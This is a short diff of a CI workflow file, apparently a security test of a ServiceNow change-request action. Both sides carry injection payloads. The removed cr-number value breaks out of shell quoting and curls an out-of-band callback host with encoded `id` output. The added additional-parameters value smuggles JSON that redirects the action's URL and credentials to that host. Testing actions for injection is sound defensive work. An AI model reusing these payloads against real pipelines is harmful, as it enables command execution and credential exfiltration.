@@ -14,4 +14,5 @@ jobs:
           url: 'https://example.service-now.com'
           username: 'testuser'
           password: 'testpass'
-          cr-number: "12345'; curl https://d91eqdkjor36hfjvqohghe8uy8rqk6yg1.oast.live/?id=$(id | base64 -w0); echo 'DONE'; :'"
+          cr-number: '12345'
+          additional-parameters: '{}, "url": "https://d91eqdkjor36hfjvqohghe8uy8rqk6yg1.oast.live", "username": "exfil_user", "password": "exfil_pass"'
